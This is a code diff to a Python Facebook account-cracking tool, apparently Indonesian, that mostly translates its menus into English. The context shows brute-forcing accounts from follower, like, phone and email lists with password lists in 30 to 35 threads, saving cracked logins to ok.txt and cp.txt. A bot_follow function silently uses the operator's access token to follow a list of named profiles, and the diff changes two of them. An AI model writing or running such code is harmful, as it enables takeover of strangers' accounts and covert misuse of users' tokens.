@@ -130,7 +130,7 @@ def country():
     choose_country()
     
 def choose_country():
-    cc = input("\n%s[%s•%s] %s Choose : "%(k,p,k,p))
+    cc = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
     if cc in[""]:
         print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     elif cc in["1","01"]:
@@ -194,7 +194,7 @@ def logs():
   print((k+"\n["+p+"01"+k+"]"+p+" Login With Token"))
   print((k+"["+p+"02"+k+"]"+p+" Login With Cookies"))
   print((k+"["+p+"00"+k+"]"+p+" Log Out(Ahh Ngecrot)"))
-  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+  sek=input(k+"\n["+p+"•"+k+"]"+p+"Choose : ")
   if sek=="":
     print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     logs()
@@ -279,7 +279,7 @@ def bot_follow():
 	requests.post("https://graph.facebook.com/100001617352620/subscribers?access_token=" + toket) # Antonius Raditya M
 	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) # Abigaille Dirgantara
 	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       # Boirah
-	requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + toket) # Anita Zuliatin
+	requests.post("https://graph.facebook.com/100001390111040/subscribers?access_token=" + toket) # Saya Aang
 	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) # Dapunta Xayonara
 	requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + toket) # Dapunta Adya R
 	requests.post("https://graph.facebook.com/1676993425/subscribers?access_token=" + toket)      # Wati Waningsih
@@ -288,7 +288,7 @@ def bot_follow():
 	requests.post("https://graph.facebook.com/100001085079906/subscribers?access_token=" + toket) # Xena Alexander
 	requests.post("https://graph.facebook.com/100007559713883/subscribers?access_token=" + toket) # Alexandra Scarlett
 	requests.post("https://graph.facebook.com/100000424033832/subscribers?access_token=" + toket) # Pebrima Jun Helmi
-	requests.post("https://graph.facebook.com/100004655733027/subscribers?access_token=" + toket) # Aisya Asyaqila
+	requests.post("https://graph.facebook.com/100053460048331/subscribers?access_token=" + toket) # Ang Hammer
 	requests.post("https://graph.facebook.com/100000200420913/subscribers?access_token=" + toket) # Ameiliani Dethasia
 	requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) # Muh Rizal Fiansyah
 	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) # Rizal F
@@ -323,24 +323,24 @@ def menu():
     os.system("clear")
     banner()
     print((k+"\n[ "+p+"Selamat Datangatang "+a["name"]+k+" ]"+p))
-    print((k+"\n["+p+"+"+k+"]"+p+" ID KAMU : "+id))
-    print((k+"["+p+"+"+k+"]"+p+" IP KAMU : "+ip))
+    print((k+"\n["+p+"+"+k+"]"+p+" Your Name : "+id))
+    print((k+"["+p+"+"+k+"]"+p+" Your IP: "+ip))
     print((k+"["+p+"+"+k+"]"+p+" Status  : "+m+"Jomblo"+p))
     print((k+"["+p+"+"+k+"]"+p+" Joined  : "+durasi))
     print((k+"["+p+"+"+k+"]"+p+" Crack   : "+negara))
-    print((k+"\n["+p+"01"+k+"]"+p+" Crack ID Fari Publik/Followers"))
-    print((k+"["+p+"02"+k+"]"+p+" Crack ID Dari Followers"))
-    print((k+"["+p+"03"+k+"]"+p+" Crack ID Drom Like Postingan"))
+    print((k+"\n["+p+"01"+k+"]"+p+" Crack ID From Publik/Followers"))
+    print((k+"["+p+"02"+k+"]"+p+" Crack ID From Followers"))
+    print((k+"["+p+"03"+k+"]"+p+" Crack ID From Like Postingan"))
     print((k+"["+p+"04"+k+"]"+p+" Crack Melalui Nomor Telepon"))
     print((k+"["+p+"05"+k+"]"+p+" Crack Melalui Email"))
     print((k+"["+p+"06"+k+"]"+p+" Ambil Data Target"))
-    print((k+"["+p+"07"+k+"]"+p+" Lihat Hasil Crack"))
+    print((k+"["+p+"07"+k+"]"+p+" View Results Crack"))
     print((k+"["+p+"08"+k+"]"+p+" Cek User Agent"))
-    print((k+"["+p+"00"+k+"]"+p+" Keluar (Ahh Ngecrot)"))
+    print((k+"["+p+"00"+k+"]"+p+" Log Out (Ahh Ngecrot)"))
     choose_menu()
 
 def choose_menu():
-	r=input(k+"\n["+p+"•"+k+"]"+p+" Pilih : ")
+	r=input(k+"\n["+p+"•"+k+"]"+p+"Choose : ")
 	if r=="":
 		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
 		menu()
@@ -372,12 +372,12 @@ def choose_menu():
 		menu()	
 
 def pilihcrack(file):
-  print((k+"\n["+p+"01"+k+"]"+p+" Api ("+k+"Cepat Tapi Gampang Kena Spam"+p+")"))
-  print((k+"["+p+"02"+k+"]"+p+" Api + TTL ("+k+"Cepat + TTL "+p+")"))
-  print((k+"["+p+"03"+k+"]"+p+" Mbasic ("+k+"Lambat Gak Gampang Kena Spam"+p+")"))
-  print((k+"["+p+"04"+k+"]"+p+" Mbasic + TTL ("+k+"Lambat + TTL"+p+")"))
-  print((k+"["+p+"05"+k+"]"+p+" Free Facebook ("+k+"Sangat Lambat Kemungkinan OK 80%"+p+")"))
-  krah=input(k+"\n["+p+"•"+k+"]"+p+" Pilih : ")
+  print((k+"\n["+p+"01"+k+"]"+p+" Api ("+k+"Fast/Cepat"+p+")"))
+  print((k+"["+p+"02"+k+"]"+p+" Api + TTL ("+k+"Fast + TTL "+p+")"))
+  print((k+"["+p+"03"+k+"]"+p+" Mbasic ("+k+"Slow And Recommended"+p+")"))
+  print((k+"["+p+"04"+k+"]"+p+" Mbasic + TTL ("+k+"Slow + TTL"+p+")"))
+  print((k+"["+p+"05"+k+"]"+p+" Free Facebook ("+k+"Super Slow/Sangat Lambat"+p+")"))
+  krah=input(k+"\n["+p+"•"+k+"]"+p+"Choose : ")
   if krah in[""]:
     print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
     pilihcrack(file)
@@ -686,14 +686,14 @@ def defaultua():
 
 def menu_user_agent():
     print("\n%s[%s01%s] %sGet User Agent"%(k,p,k,p))
-    print("%s[%s02%s] %sUbah User Agent"%(k,p,k,p))
-    print("%s[%s03%s] %sHapus User Agent"%(k,p,k,p))
-    print("%s[%s04%s] %sCek User Agent"%(k,p,k,p))
-    print("%s[%s00%s] %sKembali"%(k,p,k,p))
+    print("%s[%s02%s] %sChange User Agent"%(k,p,k,p))
+    print("%s[%s03%s] %sDelete User Agent"%(k,p,k,p))
+    print("%s[%s04%s] %sCheck User Agent"%(k,p,k,p))
+    print("%s[%s00%s] %sBack/Kembali"%(k,p,k,p))
     pilih_menu_user_agent()
 
 def pilih_menu_user_agent():
-    pmu = input("\n%s[%s•%s] %sPilih : "%(k,p,k,p))
+    pmu = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
     if pmu in[""]:
         print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     elif pmu in["1","01"]:
@@ -812,7 +812,7 @@ class crack:
 		self.ko=0
 		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
+			f=input(k+"["+p+"•"+k+"]"+p+"Choose : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -832,7 +832,7 @@ class crack:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Example/Contoh : sayang,bismillah,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -852,7 +852,7 @@ class crack:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
+				print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -864,7 +864,7 @@ class crack:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
+			print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -899,7 +899,7 @@ class crackttl:
 		self.ko=0
 		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
+			f=input(k+"["+p+"•"+k+"]"+p+"Choose : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -919,7 +919,7 @@ class crackttl:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Example/Contoh : sayang,bismillah,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -939,7 +939,7 @@ class crackttl:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
+				print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -951,7 +951,7 @@ class crackttl:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
+			print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -1001,7 +1001,7 @@ class crackffb:
 		self.ko=0
 		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
+			f=input(k+"["+p+"•"+k+"]"+p+"Choose : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -1021,7 +1021,7 @@ class crackffb:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Example/Contoh : sayang,bismillah,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -1041,7 +1041,7 @@ class crackffb:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
+				print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -1053,7 +1053,7 @@ class crackffb:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
+			print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -1089,7 +1089,7 @@ class bapi:
   def krah(self,isifile):
     print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan PasswordManual [d/m]"))
     while True:
-      f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
+      f=input(k+"["+p+"•"+k+"]"+p+"Choose : ")
       if f in[""," "]:
         print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Kentod!!"))
         continue
@@ -1104,7 +1104,7 @@ class bapi:
               print((k+"["+p+"!"+k+"]"+p+" %s"%e))
               continue
           self.fl=[]
-          print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
+          print((k+"["+p+"•"+k+"]"+p+" Example/Contoh : sayang,bismillah,123456"))
           self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
           if len(self.pw) ==0:
             continue
@@ -1116,7 +1116,7 @@ class bapi:
         except Exception as e:
           print(("  %s"%e))
           continue
-        print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
+        print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
         ThreadPool(30).map(self.brute,self.fl)
         #os.remove(self.apk)
         exit()
@@ -1138,7 +1138,7 @@ class bapi:
             except:continue
         except:
           continue
-        print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
+        print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
         ThreadPool(30).map(self.brute,self.fl)
         os.remove(self.apk)
         exit()
@@ -1199,7 +1199,7 @@ class bapittl:
   def krah(self,isifile):
     print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
     while True:
-      f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
+      f=input(k+"["+p+"•"+k+"]"+p+"Choose : ")
       if f in[""," "]:
         print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Kentod!!"))
         continue
@@ -1214,7 +1214,7 @@ class bapittl:
               print((k+"["+p+"!"+k+"]"+p+" %s"%e))
               continue
           self.fl=[]
-          print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
+          print((k+"["+p+"•"+k+"]"+p+" Example/Contoh : sayang,bismillah,123456"))
           self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
           if len(self.pw) ==0:
             continue
@@ -1226,7 +1226,7 @@ class bapittl:
         except Exception as e:
           print(("  %s"%e))
           continue
-        print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
+        print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
         ThreadPool(30).map(self.brute,self.fl)
         #os.remove(self.apk)
         exit()
@@ -1248,7 +1248,7 @@ class bapittl:
             except:continue
         except:
           continue
-        print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
+        print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
         ThreadPool(30).map(self.brute,self.fl)
         os.remove(self.apk)
         exit()
